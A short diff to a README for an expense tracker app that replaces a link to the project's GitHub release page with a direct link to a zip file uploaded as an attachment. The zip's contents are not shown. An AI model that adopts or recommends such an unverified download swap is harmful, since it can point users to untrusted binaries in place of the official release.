@@ -42,7 +42,7 @@ To run the app
 
 Go to this link and download the zip file.
 
-	https://github.com/nicholasyu1-dot/Expense-tracker-app/releases/tag/v1.0.0
+	https://github.com/user-attachments/files/25946998/Expense-tracker-app-1.0.0.zip
 
 After extracting the zip file into a folder. 
 
